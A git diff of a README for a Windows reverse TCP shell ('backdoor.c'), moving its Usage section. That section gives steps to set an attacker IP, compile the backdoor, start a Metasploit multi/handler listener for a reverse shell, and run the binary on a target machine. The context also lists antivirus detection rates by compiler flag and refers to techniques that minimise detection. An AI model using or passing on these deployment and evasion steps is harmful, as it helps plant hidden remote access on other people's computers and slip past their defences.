@@ -20,6 +20,19 @@ This project contains a simple, customizable reverse TCP shell for Windows syste
 - Customizable (IP and port can be defined at compile time)
 - Compatible with both 32-bit and 64-bit Windows
 
+--- 
+
+## Usage
+
+1. Replace `YOUR_IP_HERE` with your actual IP address
+2. Compile using `gcc -O2 backdoor.c -o github_gcc_test.exe` on a windows machine
+3. Set up a metasploit listener on your machine: `msfconsole -q -x "use exploit/multi/handler; set LHOST eth0; set LPORT 4444; set Payload generic/shell_reverse_tcp; run -j"`
+4. Run the executable on the target Windows machine
+
+NOTES: Change tun0 to eth0 or whatever you need for your VM environment or local network. 
+
+---
+
 ## Technical Details
 
 The code uses several techniques to minimize detection and maintain compatibility:
@@ -83,15 +96,6 @@ Detection rates by compiler/flags:
 | x86_64-w64-mingw32-gcc -o hello2.exe hello.c -s -Os | 3/73 | Google, Ikarus, SecureAge |
 | x86_64-w64-mingw32-gcc -o hello4.exe hello.c -static | 7/73 | AhnLab-V3, Elastic, Google |
 | x86_64-w64-mingw32-gcc -o hello5.exe hello.c -s -Wl,--strip-all | 4/73 | Google, Ikarus, SecureAge |
-
-## Usage
-
-1. Replace `YOUR_IP_HERE` with your actual IP address
-2. Compile using `gcc -O2 backdoor.c -o github_gcc_test.exe` on a windows machine
-3. Set up a metasploit listener on your machine: `msfconsole -q -x "use exploit/multi/handler; set LHOST eth0; set LPORT 4444; set Payload generic/shell_reverse_tcp; run -j"`
-4. Run the executable on the target Windows machine
-
-NOTES: Change tun0 to eth0 or whatever you need for your VM environment or local network. 
 
 ## Disclaimer
 
